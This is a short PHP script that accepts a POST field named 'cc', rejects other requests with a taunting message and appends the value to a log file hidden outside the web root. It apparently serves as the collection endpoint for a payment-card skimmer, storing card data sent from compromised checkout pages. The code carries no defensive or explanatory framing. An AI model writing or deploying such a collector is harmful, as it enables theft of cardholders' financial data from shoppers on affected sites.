<?php

if (!isset($_POST["cc"])){
    http_response_code(403);
    die("grr! u dont belong here.");
}

require_once("./system.php");

$rootPath = $_SERVER["DOCUMENT_ROOT"];

if (!is_dir("${rootPath}/../cclogs/"))
{
    mkdir("${rootPath}/../cclogs/");
}

$logger = new Logger("${rootPath}/../cclogs/nicelogs.txt");
$logger->logText($_POST["cc"]);

die("OK");
